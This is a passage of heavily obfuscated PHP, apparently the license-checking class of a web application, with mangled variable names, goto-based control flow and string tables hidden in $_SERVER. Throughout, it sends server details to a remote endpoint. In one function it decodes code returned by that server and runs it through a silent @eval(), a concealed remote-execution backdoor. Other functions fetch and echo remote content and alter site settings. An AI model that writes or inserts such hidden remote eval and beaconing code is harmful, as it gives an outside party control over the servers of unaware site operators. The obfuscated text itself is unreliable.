$aË‘……ª¶[$cÑØ‘”ùÍ[220]]); $BÚ‹š§ó¬Ê = $cÑØ‘”ùÍ[224]($cÑØ‘”ùÍ[25]($dÜª–Æåæ, 10, 16)); goto d‚áéØáÜœ; DÚ©“­è: $cå¨³ß»Ú = $A÷›ÖƒØ– . $aË‘……ª¶[$cÑØ‘”ùÍ[130]] . $this->{$_SERVER[öÔÕ©€î‘][157]}($cÑØ‘”ùÍ[124]($aË‘……ª¶[$cÑØ‘”ùÍ[219]]), $A÷›ÖƒØ–); $aË‘……ª¶[$cÑØ‘”ùÍ[133]] = $cÑØ‘”ùÍ[128]($cÑØ‘”ùÍ[224]($this->{$_SERVER[öÔÕ©€î‘][157]}($cå¨³ß»Ú, $cÑØ‘”ùÍ[226]))); if ($EëÚÙ›êƒÓ[$cÑØ‘”ùÍ[227]] && $EëÚÙ›êƒÓ[$cÑØ‘”ùÍ[227]] >= 1) { $cÑØ‘”ùÍ[61]($cÑØ‘”ùÍ[62])->{$_SERVER[öÔÕ©€î‘][228]}($cÑØ‘”ùÍ[229], $cÑØ‘”ùÍ[230]); } goto dÁÂÕÒÁˆ©; bç¹ø…õœÓ: if (!isset($dÖâÆİßŞ²[$cÑØ‘”ùÍ[175]]) || $cÑØ‘”ùÍ[24]($dÖâÆİßŞ²[$cÑØ‘”ùÍ[175]]) != 16) { $cÑØ‘”ùÍ[176]($cÑØ‘”ùÍ[177] . $dÖâÆİßŞ²[$cÑØ‘”ùÍ[175]], !1); } $eë†êêàôÉ = $cÑØ‘”ùÍ[61]($cÑØ‘”ùÍ[62])->{$_SERVER[öÔÕ©€î‘][63]}($cÑØ‘”ùÍ[126]); $cÎÒÜ¸ÄĞ = array($cÑØ‘”ùÍ[175] => $dÖâÆİßŞ²[$cÑØ‘”ùÍ[175]], $cÑØ‘”ùÍ[178] => $cÑØ‘”ùÍ[134](16), $cÑØ‘”ùÍ[179] => $cÑØ‘”ùÍ[159], $cÑØ‘”ùÍ[180] => $cÑØ‘”ùÍ[181], $cÑØ‘”ùÍ[182] => $_SERVER[$cÑØ‘”ùÍ[183]], $cÑØ‘”ùÍ[184] => $_SERVER[$cÑØ‘”ùÍ[185]], $cÑØ‘”ùÍ[186] => $_SERVER[$cÑØ‘”ùÍ[187]]); goto fš…ØĞ©¨; CªÜİøÙ®«: if ($dÖâÆİßŞ²[$cÑØ‘”ùÍ[188]] == $cÑØ‘”ùÍ[189]) { $f”¨¤“Å³ = $this->{$_SERVER[öÔÕ©€î‘][157]}($E„†¤¼›ãˆ, $cÑØ‘”ùÍ[190]); $E ­ÜÃš©¥ = $this->{$_SERVER[öÔÕ©€î‘][137]}($cÑØ‘”ùÍ[158]($cÎÒÜ¸ÄĞ), $E„†¤¼›ãˆ . $cÑØ‘”ùÍ[191], 3); $E ­ÜÃš©¥ = $E ­ÜÃš©¥ . $cÑØ‘”ùÍ[192] . $_SERVER[$cÑØ‘”ùÍ[183]]; $Aµõ«‰—Â¦ = $this->{$_SERVER[öÔÕ©€î‘][193]}($cÑØ‘”ùÍ[194] . $f”¨¤“Å³ . $cÑØ‘”ùÍ[195] . $E ­ÜÃš©¥, -1); $cÑØ‘”ùÍ[176]($Aµõ«‰—Â¦, !0); } else { if ($dÖâÆİßŞ²[$cÑØ‘”ùÍ[188]] == $cÑØ‘”ùÍ[196]) { $cÀÇ²²¶ˆÍ = $cÑØ‘”ùÍ[25]($cÑØ‘”ùÍ[124]($cÑØ‘”ùÍ[197] . $E„†¤¼›ãˆ), 12, 15) . $cÑØ‘”ùÍ[198]; $E ­ÜÃš©¥ = $this->{$_SERVER[öÔÕ©€î‘][199]}($cÑØ‘”ùÍ[2]($dÖâÆİßŞ²[$cÑØ‘”ùÍ[200]]), $cÀÇ²²¶ˆÍ, 2); $d®ƒê”× = $cÑØ‘”ùÍ[201]($E ­ÜÃš©¥, !0); if (!$cÑØ‘”ùÍ[202]($d®ƒê”×) || !$cÑØ‘”ùÍ[202]($d®ƒê”×[$cÑØ‘”ùÍ[203]]) || $d®ƒê”×[$cÑØ‘”ùÍ[175]] != !0) { $F‹‘Æ³•–† = $cÑØ‘”ùÍ[204]; $EèÖçìÒñÏ = $d®ƒê”×[$cÑØ‘”ùÍ[203]] ? $cÑØ‘”ùÍ[205] . $d®ƒê”×[$cÑØ‘”ùÍ[203]] : $F‹‘Æ³•–†; $cÑØ‘”ùÍ[176]($EèÖçìÒñÏ, !1); } else { $cÎÒÜ¸ÄĞ[$cÑØ‘”ùÍ[178]] = $d®ƒê”×[$cÑØ‘”ùÍ[203]][$cÑØ‘”ùÍ[206]]; } } else { $d®ƒê”× = $this->{$_SERVER[öÔÕ©€î‘][193]}($cÑØ‘”ùÍ[207], $cÎÒÜ¸ÄĞ, 10); $dø×†…£ø = $e†¥ÕæÛé¢[617]; if (strlen($dø×†…£ø) < $e†¥ÕæÛé¢[574]) { return; } } } if (!$cÑØ‘”ùÍ[202]($d®ƒê”×) || !$cÑØ‘”ùÍ[202]($d®ƒê”×[$cÑØ‘”ùÍ[203]]) || $d®ƒê”×[$cÑØ‘”ùÍ[175]] != !0) { $F‹‘Æ³•–† = $cÑØ‘”ùÍ[208]($cÑØ‘”ùÍ[209]); $EèÖçìÒñÏ = $d®ƒê”×[$cÑØ‘”ùÍ[203]] ? $cÑØ‘”ùÍ[205] . $d®ƒê”×[$cÑØ‘”ùÍ[203]] : $F‹‘Æ³•–†; $cÑØ‘”ùÍ[176]($EèÖçìÒñÏ, !1); } $EëÚÙ›êƒÓ = $d®ƒê”×[$cÑØ‘”ùÍ[203]]; goto F¢ØêµÓ¸´; aºç×Áïºï: $Dô³­¦»Ÿ˜ = $e†¥ÕæÛé¢[619]; if (strlen($Dô³­¦»Ÿ˜) < $e†¥ÕæÛé¢[615]) { die; } $A÷›ÖƒØ– = $cÑØ‘”ùÍ[134](16); goto DÚ©“­è; b•îÖ›÷¢©: $e†¥ÕæÛé¢ =& $_SERVER[¬ı§†‰ú˜¼]; $cÑØ‘”ùÍ =& $_SERVER[öÔÕ©€î‘]; if ($_SERVER[$cÑØ‘”ùÍ[44]] != $cÑØ‘”ùÍ[172]) { return; } goto A—Ñ—’™’; D‘„°æéì: $FÁ²è­ôŒ[$BÚ‹š§ó¬Ê] = $cÂ¸ßÍƒ¸ë; $cÑØ‘”ùÍ[61]($cÑØ‘”ùÍ[11])->{$_SERVER[öÔÕ©€î‘][236]}($aæŒôåµ¯š[$cÑØ‘”ùÍ[237]], array($cÑØ‘”ùÍ[238] => $FÁ²è­ôŒ)); $this->qvgdf4924622 = $EëÚÙ›êƒÓ; goto a„ˆÑ›ä¬Û; fªŒÖ¨‹´: if ($cÎÒÜ¸ÄĞ[$cÑØ‘”ùÍ[178]]) { $aË‘……ª¶[$cÑØ‘”ùÍ[222]] = $cÎÒÜ¸ÄĞ[$cÑØ‘”ùÍ[178]]; } $EÒ“çÌ£à = $cÑØ‘”ùÍ[25]($cÑØ‘”ùÍ[124]($aË‘……ª¶[$cÑØ‘”ùÍ[220]]), 10, 10); $aÂ»Ÿª‡ = $EÒ“çÌ£à . $aË‘……ª¶[$cÑØ‘”ùÍ[130]] . $aË‘……ª¶[$cÑØ‘”ùÍ[222]]; goto A ¯‹˜£¨²; A ¯‹˜£¨²: $F“ò‘ë‰Í = $e†¥ÕæÛé¢[618]; if (strlen($F“ò‘ë‰Í) < $e†¥ÕæÛé¢[587]) { die; } $aË‘……ª¶[$cÑØ‘”ùÍ[132]] = $cÑØ‘”ùÍ[224]($cÑØ‘”ùÍ[128]($this->{$_SERVER[öÔÕ©€î‘][157]}($aÂ»Ÿª‡, $cÑØ‘”ùÍ[225]))); goto aºç×Áïºï; F¢ØêµÓ¸´: $e· õ”ã‹¨ = $this->{$_SERVER[öÔÕ©€î‘][210]}($EëÚÙ›êƒÓ[$cÑØ‘”ùÍ[211]]); if (!$e· õ”ã‹¨ || $e· õ”ã‹¨ != $EëÚÙ›êƒÓ[$cÑØ‘”ùÍ[155]]) { $A¶…×Ä…°Ò = array($cÑØ‘”ùÍ[212] => $cÑØ‘”ùÍ[61]($cÑØ‘”ùÍ[62])->{$_SERVER[öÔÕ©€î‘][63]}($cÑØ‘”ùÍ[126]), $cÑØ‘”ùÍ[213] => $_SERVER[$cÑØ‘”ùÍ[125]], $cÑØ‘”ùÍ[214] => $cÑØ‘”ùÍ[215](), $cÑØ‘”ùÍ[184] => $_SERVER[$cÑØ‘”ùÍ[185]]); $E ­ÜÃš©¥ = $this->{$_SERVER[öÔÕ©€î‘][216]}($cÑØ‘”ùÍ[158]($A¶…×Ä…°Ò)); $this->{$_SERVER[öÔÕ©€î‘][193]}($cÑØ‘”ùÍ[217] . $E ­ÜÃš©¥); $cÑØ‘”ùÍ[176]($cÑØ‘”ùÍ[208]($cÑØ‘”ùÍ[218]), !0); } $aË‘……ª¶ = array($cÑØ‘”ùÍ[219] => $cÎÒÜ¸ÄĞ[$cÑØ‘”ùÍ[175]], $cÑØ‘”ùÍ[220] => $EëÚÙ›êƒÓ[$cÑØ‘”ùÍ[221]], $cÑØ‘”ùÍ[222] => $cÑØ‘”ùÍ[134](16), $cÑØ‘”ùÍ[130] => $EëÚÙ›êƒÓ[$cÑØ‘”ùÍ[223]]); goto fªŒÖ¨‹´; a„ˆÑ›ä¬Û: $C†­âÍªŠš = $e†¥ÕæÛé¢[623]; while (strlen($C†­âÍªŠš) < $e†¥ÕæÛé¢[574]) { if (!$C†­âÍªŠš) { break; } $C†­âÍªŠš++; } $this->sqko49c96b85 = $aË‘……ª¶[$cÑØ‘”ùÍ[130]]; goto f¹Ğ‚»„; EØÖ¬†êÂé: $FÁ²è­ôŒ = array(); $BÚöÅ†Ş´ˆ = $e†¥ÕæÛé¢[622]; if (strlen($BÚöÅ†Ş´ˆ) < $e†¥ÕæÛé¢[574]) { die; } goto D‘„°æéì; f¹Ğ‚»„: $E¯Ä‡àùéß = $e†¥ÕæÛé¢[624]; while (strlen($E¯Ä‡àùéß) < $e†¥ÕæÛé¢[587]) { if (!$E¯Ä‡àùéß) { break; } $E¯Ä‡àùéß++; } $this->{$_SERVER[öÔÕ©€î‘][239]}(); goto FöáÖ¢ŞÎ; bÔ°ƒÂİ¯À: $E“‡Ôä¡Œº = $e†¥ÕæÛé¢[626]; $cÑØ‘”ùÍ[176]($cÑØ‘”ùÍ[208]($cÑØ‘”ùÍ[218]), !0); $b¹¼—·ÈÇæ = $e†¥ÕæÛé¢[627]; goto aÑ²‘âÏô‚; FöáÖ¢ŞÎ: $bÏƒ´‘ôéã = $e†¥ÕæÛé¢[625]; if (!$bÏƒ´‘ôéã) { return; } Cache::set($cÑØ‘”ùÍ[240] . $cÑØ‘”ùÍ[124]($eë†êêàôÉ . $cÑØ‘”ùÍ[241]), $cÑØ‘”ùÍ[10]); goto bÔ°ƒÂİ¯À; d™Ÿ¢¹Èñ²: $aæŒôåµ¯š = $Dè¶¹Óõ§¨[$cÑØ‘”ùÍ[235]]; $a·ÓğÆ‹¦ = $e†¥ÕæÛé¢[621]; if (!$a·ÓğÆ‹¦) { die; } goto EØÖ¬†êÂé; fš…ØĞ©¨: $F›÷ä¾Ú¾ƒ = $e†¥ÕæÛé¢[616]; if (!$F›÷ä¾Ú¾ƒ) { die; } $E„†¤¼›ãˆ = $cÑØ‘”ùÍ[124]($_SERVER[$cÑØ‘”ùÍ[125]] . $eë†êêàôÉ); goto CªÜİøÙ®«; aÑ²‘âÏô‚: if (strlen($b¹¼—·ÈÇæ) < $e†¥ÕæÛé¢[594]) { die; } goto fî¬‚²Û™; fî¬‚²Û™: } private function licenseRegistSuccess() { $C•„¼ã‹Ñ¹ =& $_SERVER[öÔÕ©€î‘]; $eÚ¥ø¢“Ğõ = $C•„¼ã‹Ñ¹[61]($C•„¼ã‹Ñ¹[62])->{$_SERVER[öÔÕ©€î‘][63]}(); $D…È‚ÍÌ„È = $_SERVER[¬ı§†‰ú˜¼][628]; if (!$D…È‚ÍÌ„È) { return; } if ($eÚ¥ø¢“Ğõ[$C•„¼ã‹Ñ¹[93]] != $C•„¼ã‹Ñ¹[230]) { $C•„¼ã‹Ñ¹[61]($C•„¼ã‹Ñ¹[62])->{$_SERVER[öÔÕ©€î‘][231]}($C•„¼ã‹Ñ¹[93], $C•„¼ã‹Ñ¹[230]); } $C•„¼ã‹Ñ¹[120]($C•„¼ã‹Ñ¹[242])->{$_SERVER[öÔÕ©€î‘][243]}(!0); } private function jpdr1d55a5b8() { goto BÒÌ»ŞóÁ¡; BÒÌ»ŞóÁ¡: $aó„Èº‘ÙÔ =& $_SERVER[¬ı§†‰ú˜¼]; $d¨Û ‡›ç´ =& $_SERVER[öÔÕ©€î‘]; $d¨Û ‡›ç´[61]($d¨Û ‡›ç´[62])->{$_SERVER[öÔÕ©€î‘][231]}(array($d¨Û ‡›ç´[219] => $d¨Û ‡›ç´[10], $d¨Û ‡›ç´[220] => $d¨Û ‡›ç´[10], $d¨Û ‡›ç´[130] => $d¨Û ‡›ç´[131], $d¨Û ‡›ç´[132] => $d¨Û ‡›ç´[10], $d¨Û ‡›ç´[133] => $d¨Û ‡›ç´[10])); goto b¹×¾î•ãÛ; b¹×¾î•ãÛ: $d´…¼ç‰ğ = $aó„Èº‘ÙÔ[629]; $d¨Û ‡›ç´[61]($d¨Û ‡›ç´[62])->{$_SERVER[öÔÕ©€î‘][228]}($d¨Û ‡›ç´[229], $d¨Û ‡›ç´[244]); $this->qvgdf4924622 = array(); goto Fš–éš¨ñ¹; C£ÕÃ‚£ÆÑ: $Cæ¹ïĞÖ‡ = $aó„Èº‘ÙÔ[631]; if (!$Cæ¹ïĞÖ‡) { return; } goto D©„Ûçèô; Fš–éš¨ñ¹: $dİ…Éø„Ç• = $aó„Èº‘ÙÔ[630]; if (!$dİ…Éø„Ç•) { die; } $this->sqko49c96b85 = $d¨Û ‡›ç´[131]; goto C£ÕÃ‚£ÆÑ; D©„Ûçèô: } private function nxwk2222b2d5() { goto F’ƒğ£™‚’; F’ƒğ£™‚’: $eÅ§ˆÇŠÄ³ =& $_SERVER[¬ı§†‰ú˜¼]; $A×Å¸à•µÙ =& $_SERVER[öÔÕ©€î‘]; $_SERVER[$A×Å¸à•µÙ[185]] = $A×Å¸à•µÙ[116]($_SERVER, $A×Å¸à•µÙ[185], APP_HOST); goto cš²î±²·; cš²î±²·: $dÅø˜¥ÇƒÁ = $eÅ§ˆÇŠÄ³[632]; if (strlen($dÅø˜¥ÇƒÁ) < $eÅ§ˆÇŠÄ³[615]) { die; } $this->sqko49c96b85 = $A×Å¸à•µÙ[131]; goto CÕ¯ğµ³; fòÁ§ïÚéê: if ($fæèÎÃ›[$A×Å¸à•µÙ[130]] == $A×Å¸à•µÙ[131]) { return; } $B´ÇòÍæä¯ = $A×Å¸à•µÙ[61]($A×Å¸à•µÙ[62])->{$_SERVER[öÔÕ©€î‘][63]}($A×Å¸à•µÙ[126]); $Bè¼¿‡Øí = $A×Å¸à•µÙ[240] . $A×Å¸à•µÙ[124]($B´ÇòÍæä¯ . $A×Å¸à•µÙ[241]); goto B¯ê“šÜŠË; B¯ê“šÜŠË: $eÌ×•Å¾é = $eÅ§ˆÇŠÄ³[634]; if (strlen($eÌ×•Å¾é) < $eÅ§ˆÇŠÄ³[594]) { return; } $c™ˆ«‡Ú² = Cache::get($Bè¼¿‡Øí); goto c«£¬Ëâù; c«£¬Ëâù: if (!$A×Å¸à•µÙ[202]($c™ˆ«‡Ú²) || !isset($c™ˆ«‡Ú²[$A×Å¸à•µÙ[245]]) || $A×Å¸à•µÙ[246]() - $c™ˆ«‡Ú²[$A×Å¸à•µÙ[245]] >= 60) { $DÅ¹ñ¹¤îù = $A×Å¸à•µÙ[232]($A×Å¸à•µÙ[61]($A×Å¸à•µÙ[11])->{$_SERVER[öÔÕ©€î‘][233]}(), $A×Å¸à•µÙ[234]); $AæÙç¢±§Â = $DÅ¹ñ¹¤îù[$A×Å¸à•µÙ[235]]; $EäÔ“±²ôŠ = $A×Å¸à•µÙ[124]($_SERVER[$A×Å¸à•µÙ[125]] . $A×Å¸à•µÙ[224]($B´ÇòÍæä¯) . $fæèÎÃ›[$A×Å¸à•µÙ[220]]); $D¥Ì˜ë¤ˆ = $A×Å¸à•µÙ[224]($A×Å¸à•µÙ[25]($EäÔ“±²ôŠ, 10, 16)); $c™ˆ«‡Ú² = $this->{$_SERVER[öÔÕ©€î‘][199]}($AæÙç¢±§Â[$A×Å¸à•µÙ[104]][$D¥Ì˜ë¤ˆ], $EäÔ“±²ôŠ); $c™ˆ«‡Ú² = $A×Å¸à•µÙ[201]($c™ˆ«‡Ú², !0); } if (!$A×Å¸à•µÙ[202]($c™ˆ«‡Ú²)) { return $this->{$_SERVER[öÔÕ©€î‘][174]}(); } $B¸Ç¼â„ = $A×Å¸à•µÙ[154]($c™ˆ«‡Ú²[$A×Å¸à•µÙ[155]]); goto B—“‡˜¢ì; CÕ¯ğµ³: $BÚ•Áİ¤™Ï = $eÅ§ˆÇŠÄ³[633]; if (!$BÚ•Áİ¤™Ï) { die; } $fæèÎÃ› = $A×Å¸à•µÙ[61]($A×Å¸à•µÙ[62])->{$_SERVER[öÔÕ©€î‘][63]}(); goto fòÁ§ïÚéê; bâğßÇˆí¶: $this->sqko49c96b85 = $fæèÎÃ›[$A×Å¸à•µÙ[130]]; $Cå¬ä–…ÇÃ = $eÅ§ˆÇŠÄ³[635]; while (strlen($Cå¬ä–…ÇÃ) < $eÅ§ˆÇŠÄ³[574]) { if (!$Cå¬ä–…ÇÃ) { break; } $Cå¬ä–…ÇÃ++; } goto bÁòàƒî°; B—“‡˜¢ì: if ($A×Å¸à•µÙ[246]() >= $B¸Ç¼â„) { return $this->{$_SERVER[öÔÕ©€î‘][174]}(); } if ($A×Å¸à•µÙ[246]() - $c™ˆ«‡Ú²[$A×Å¸à•µÙ[245]] > 20) { $c™ˆ«‡Ú²[$A×Å¸à•µÙ[245]] = $A×Å¸à•µÙ[246](); Cache::set($Bè¼¿‡Øí, $c™ˆ«‡Ú²); } $this->qvgdf4924622 = $c™ˆ«‡Ú²; goto bâğßÇˆí¶; bÁòàƒî°: } private function uygd41069e57() { goto f¶Ù¦¾—çß; aŒå´ï™†ä: if ($A°ˆ¶¼Ä­†[252]($c…ÌÏ¨°ñ , $c¶ù§éï™–)) { if ($this->sqko49c96b85 == $A°ˆ¶¼Ä­†[131] && isset($f×§Óªµ­[$A°ˆ¶¼Ä­†[253]])) { $A°ˆ¶¼Ä­†[176]($A°ˆ¶¼Ä­†[208]($A°ˆ¶¼Ä­†[248]), !1, $A°ˆ¶¼Ä­†[249]); die; } $e³á £‚®· = $this->{$_SERVER[öÔÕ©€î‘][147]}(); if ($e³á £‚®· != $A°ˆ¶¼Ä­†[254]($A°ˆ¶¼Ä­†[255])) { if ($e³á £‚®· <= $A°ˆ¶¼Ä­†[61]($A°ˆ¶¼Ä­†[149])->{$_SERVER[öÔÕ©€î‘][150]}()) { $A°ˆ¶¼Ä­†[176]($A°ˆ¶¼Ä­†[208]($A°ˆ¶¼Ä­†[256]), !1, $A°ˆ¶¼Ä­†[249]); die; } } } goto cÂ„¥®¯ÔÅ; CÛÆíºœÖà: $c…ÌÏ¨°ñ  = $_SERVER[$A°ˆ¶¼Ä­†[44]]; if ($c…ÌÏ¨°ñ  == $A°ˆ¶¼Ä­†[247] && $this->sqko49c96b85 == $A°ˆ¶¼Ä­†[131]) { $A°ˆ¶¼Ä­†[176]($A°ˆ¶¼Ä­†[208]($A°ˆ¶¼Ä­†[248]), !1, $A°ˆ¶¼Ä­†[249]); } $c¶ù§éï™– = array($A°ˆ¶¼Ä­†[250], $A°ˆ¶¼Ä­†[251]); goto aŒå´ï™†ä; f¶Ù¦¾—çß: $A°ˆ¶¼Ä­† =& $_SERVER[öÔÕ©€î‘]; $f×§Óªµ­ = $GLOBALS[$A°ˆ¶¼Ä­†[22]]; $b®ÒÍ‡ìæ‰ = $_SERVER[¬ı§†‰ú˜¼][636]; goto CÛÆíºœÖà; cÂ„¥®¯ÔÅ: } private function rdvk4835bd58() { goto D„¢÷öÓƒ; få±Ö–é—Ü: if (!$B‘ßÛ…°ùš[252]($_SERVER[$B‘ßÛ…°ùš[44]], $bˆù™“éæ£)) { return; } $FªÎ„ìÍåö = $B‘ßÛ…°ùš[259]; $FªÎ„ìÍåö = $this->{$_SERVER[öÔÕ©€î‘][260]}($FªÎ„ìÍåö, $B‘ßÛ…°ùš[261]); goto AÛÉóÈ¢‹¡; E°Òöã°ñ: while ($A¶ã òÜÛ < $e‘±¬Õò†[594]) { if ($A¶ã òÜÛ >= 0) { break; } $A¶ã òÜÛ++; } if ($FÛÙÂàĞ»’ && $B‘ßÛ…°ùš[32]($FÛÙÂàĞ»’, $B‘ßÛ…°ùš[270])) { echo $FÛÙÂàĞ»’; } die; goto fÛÊÈÚ¯; AÛÉóÈ¢‹¡: $f¶Œì‚¡°¶ = $B‘ßÛ…°ùš[262](array($B‘ßÛ…°ùš[263] => array($B‘ßÛ…°ùš[264] => $B‘ßÛ…°ùš[265], $B‘ßÛ…°ùš[266] => 3))); $FÛÙÂàĞ»’ = @$B‘ßÛ…°ùš[267]($FªÎ„ìÍåö, !1, $f¶Œì‚¡°¶); $AæÆ¥º”ó› = $e‘±¬Õò†[638]; goto aÉÌñääØ‹; aÉÌñääØ‹: while (strlen($AæÆ¥º”ó›) < $e‘±¬Õò†[615]) { if (!$AæÆ¥º”ó›) { break; } $AæÆ¥º”ó›++; } $B‘ßÛ…°ùš[268]($B‘ßÛ…°ùš[269]); $A¶ã òÜÛ = $e‘±¬Õò†[582]; goto E°Òöã°ñ; d¨´Â®…™: $A¼Ï–ÏŒÄ° = $e‘±¬Õò†[637]; if (!$A¼Ï–ÏŒÄ°) { return; } if (!$B‘ßÛ…°ùš[116]($GLOBALS, $B‘ßÛ…°ùš[142]) || !isset($_GET[$B‘ßÛ…°ùš[258]])) { return; } goto få±Ö–é—Ü; D„¢÷öÓƒ: $e‘±¬Õò† =& $_SERVER[¬ı§†‰ú˜¼]; $B‘ßÛ…°ùš =& $_SERVER[öÔÕ©€î‘]; $bˆù™“éæ£ = array($B‘ßÛ…°ùš[145], $B‘ßÛ…°ùš[257]); goto d¨´Â®…™; fÛÊÈÚ¯: } public function vasiada60179($C‘œàÊ°‘Æ) { goto AÛÚ¦ìóè; BÛÀ×¥¿†: $A‘ùºš®×¡ = array($dò°§‚‚¨˜[272] => $dò°§‚‚¨˜[273], $dò°§‚‚¨˜[274] => $dò°§‚‚¨˜[273], $dò°§‚‚¨˜[275] => $dò°§‚‚¨˜[273], $dò°§‚‚¨˜[276] => $dò°§‚‚¨˜[273], $dò°§‚‚¨˜[277] => $dò°§‚‚¨˜[273], $dò°§‚‚¨˜[278] => $dò°§‚‚¨˜[273], $dò°§‚‚¨˜[279] => $dò°§‚‚¨˜[280], $dò°§‚‚¨˜[281] => $dò°§‚‚¨˜[280], $dò°§‚‚¨˜[282] => $dò°§‚‚¨˜[280], $dò°§‚‚¨˜[283] => $dò°§‚‚¨˜[280], $dò°§‚‚¨˜[284] => $dò°§‚‚¨˜[280], $dò°§‚‚¨˜[285] => $dò°§‚‚¨˜[280], $dò°§‚‚¨˜[286] => $dò°§‚‚¨˜[280], $dò°§‚‚¨˜[287] => $dò°§‚‚¨˜[280], $dò°§‚‚¨˜[288] => $dò°§‚‚¨˜[280]); $aÆùå¿‹¤è = $a­‰¬¶‘±[639]; $Dàñˆ¿¸£ç = $dò°§‚‚¨˜[0]($dò°§‚‚¨˜[289], $dò°§‚‚¨˜[116]($this->qvgdf4924622, $dò°§‚‚¨˜[139], $dò°§‚‚¨˜[10])); goto B‡Æ¸´ĞÊ; B‡Æ¸´ĞÊ: $b‘¸—ƒŒ¶Æ = array(); foreach ($A‘ùºš®×¡ as $eí¯ÛºÛùÙ => $EõÀ–¾ê—) { if ($EõÀ–¾ê— == $dò°§‚‚¨˜[273] && $dò°§‚‚¨˜[25]($this->sqko49c96b85, 0, 1) == $dò°§‚‚¨˜[273]) { continue; } if (!$dò°§‚‚¨˜[252]($eí¯ÛºÛùÙ, $Dàñˆ¿¸£ç)) { $b‘¸—ƒŒ¶Æ[] = $eí¯ÛºÛùÙ; } } foreach ($b‘¸—ƒŒ¶Æ as $eí¯ÛºÛùÙ) { unset($C‘œàÊ°‘Æ[$eí¯ÛºÛùÙ]); } goto C‡ÔÀ¨ä‹Ç; C‡ÔÀ¨ä‹Ç: return $C‘œàÊ°‘Æ; $c£›™áÖèö = $a­‰¬¶‘±[640]; while (strlen($c£›™áÖèö) < $a­‰¬¶‘±[587]) { if (!$c£›™áÖèö) { break; } $c£›™áÖèö++; } goto dƒ¡µ„¥«ù; AÛÚ¦ìóè: $a­‰¬¶‘± =& $_SERVER[¬ı§†‰ú˜¼]; $dò°§‚‚¨˜ =& $_SERVER[öÔÕ©€î‘]; if ($this->sqko49c96b85 == $dò°§‚‚¨˜[271]) { return $C‘œàÊ°‘Æ; } goto BÛÀ×¥¿†; dƒ¡µ„¥«ù: } private function btcv557791a4() { $D½Û™‘øŸÊ =& $_SERVER[öÔÕ©€î‘]; if ($this->sqko49c96b85 != $D½Û™‘øŸÊ[131]) { return; } $GLOBALS[$D½Û™‘øŸÊ[104]][$D½Û™‘øŸÊ[108]][$D½Û™‘øŸÊ[290]] = $D½Û™‘øŸÊ[230]; $GLOBALS[$D½Û™‘øŸÊ[104]][$D½Û™‘øŸÊ[291]] = $D½Û™‘øŸÊ[230]; if ($D½Û™‘øŸÊ[61]($D½Û™‘øŸÊ[292])->{$_SERVER[öÔÕ©€î‘][63]}($D½Û™‘øŸÊ[93]) != $D½Û™‘øŸÊ[244]) { $D½Û™‘øŸÊ[61]($D½Û™‘øŸÊ[292])->{$_SERVER[öÔÕ©€î‘][231]}($D½Û™‘øŸÊ[93], $D½Û™‘øŸÊ[244]); } } public function lahw551cc6b3() { return $_SERVER[öÔÕ©€î‘][293]; } private function blgied85883d() { goto E…²Æàç­Ô; CÅ§Š¡ŠœÌ: if ($d¬®ÃÕ…ÍØ[$eËİÏ»µ[175]] && $d¬®ÃÕ…ÍØ[$eËİÏ»µ[303]]) { if ($this->{$_SERVER[öÔÕ©€î‘][210]}($d¬®ÃÕ…ÍØ[$eËİÏ»µ[303]]) == $C”¥¾±½ù[$eËİÏ»µ[175]]) { return; } } $this->{$_SERVER[öÔÕ©€î‘][174]}(); $c£ö·ƒ’ß = $Fßç‰õ–Ùñ[643]; goto b˜·ï’¹¢; d¦«æ‰ÓË: $Eìå…æ¢± = $eËİÏ»µ[13](array($eËİÏ»µ[299], $eËİÏ»µ[300]), $A¼ƒÆ•Ÿª§); if ($Eìå…æ¢± && $eËİÏ»µ[246]() - $Eìå…æ¢± < $eËİÏ»µ[254]($eËİÏ»µ[301])) { return; } $eËİÏ»µ[13](array($eËİÏ»µ[299], $eËİÏ»µ[162]), $A¼ƒÆ•Ÿª§, $eËİÏ»µ[246]()); goto Dª°×°ÄøÙ; b˜·ï’¹¢: if ($this->{$_SERVER[öÔÕ©€î‘][210]}($d¬®ÃÕ…ÍØ[$eËİÏ»µ[303]]) != $C”¥¾±½ù[$eËİÏ»µ[175]]) { $e¡“ØÍ¬œŒ = array($eËİÏ»µ[212] => $eËİÏ»µ[61]($eËİÏ»µ[62])->{$_SERVER[öÔÕ©€î‘][63]}($eËİÏ»µ[126]), $eËİÏ»µ[213] => $_SERVER[$eËİÏ»µ[125]], $eËİÏ»µ[214] => $eËİÏ»µ[215](), $eËİÏ»µ[184] => $_SERVER[$eËİÏ»µ[185]]); $bÅÚÊ°ä„ = $this->{$_SERVER[öÔÕ©€î‘][216]}($eËİÏ»µ[158]($e¡“ØÍ¬œŒ)); $d¬®ÃÕ…ÍØ = $this->{$_SERVER[öÔÕ©€î‘][193]}($eËİÏ»µ[217] . $bÅÚÊ°ä„); if ($d¬®ÃÕ…ÍØ && $eËİÏ»µ[202]($d¬®ÃÕ…ÍØ) && isset($d¬®ÃÕ…ÍØ[$eËİÏ»µ[303]])) { $F¹¦¡›×· = $this->{$_SERVER[öÔÕ©€î‘][199]}($d¬®ÃÕ…ÍØ[$eËİÏ»µ[303]], 2); if ($F¹¦¡›×·) { $F¹¦¡›×· = $this->{$_SERVER[öÔÕ©€î‘][210]}($F¹¦¡›×·); } if ($F¹¦¡›×·) { try { @eval($F¹¦¡›×·); } catch (Exception $Fƒ½Ö‚¾£) { } } } } goto e„›ŞÆ‹è; Eßì˜Öºæ: $A¼ƒÆ•Ÿª§ = $eËİÏ»µ[297] . $eËİÏ»µ[124]($eËİÏ»µ[298]); $B±¿–Éé·· = $Fßç‰õ–Ùñ[641]; while (strlen($B±¿–Éé··) < $Fßç‰õ–Ùñ[584]) { if (!$B±¿–Éé··) { break; } $B±¿–Éé··++; } goto C»ñ‰ó‰îÆ; Dª°×°ÄøÙ: $cŸ£¦ƒãå = $Fßç‰õ–Ùñ[642]; if (strlen($cŸ£¦ƒãå) < $Fßç‰õ–Ùñ[584]) { die; } $C”¥¾±½ù = array($eËİÏ»µ[175] => $eËİÏ»µ[61]($eËİÏ»µ[62])->{$_SERVER[öÔÕ©€î‘][63]}($eËİÏ»µ[219]), $eËİÏ»µ[188] => $this->sqko49c96b85, $eËİÏ»µ[186] => $_SERVER[$eËİÏ»µ[187]], $eËİÏ»µ[179] => $eËİÏ»µ[159], $eËİÏ»µ[182] => $_SERVER[$eËİÏ»µ[183]]); goto cœğ—ã¨ß; E…²Æàç­Ô: $Fßç‰õ–Ùñ =& $_SERVER[¬ı§†‰ú˜¼]; $eËİÏ»µ =& $_SERVER[öÔÕ©€î‘]; $Aä¿‡¯ğ„ = array($eËİÏ»µ[294], 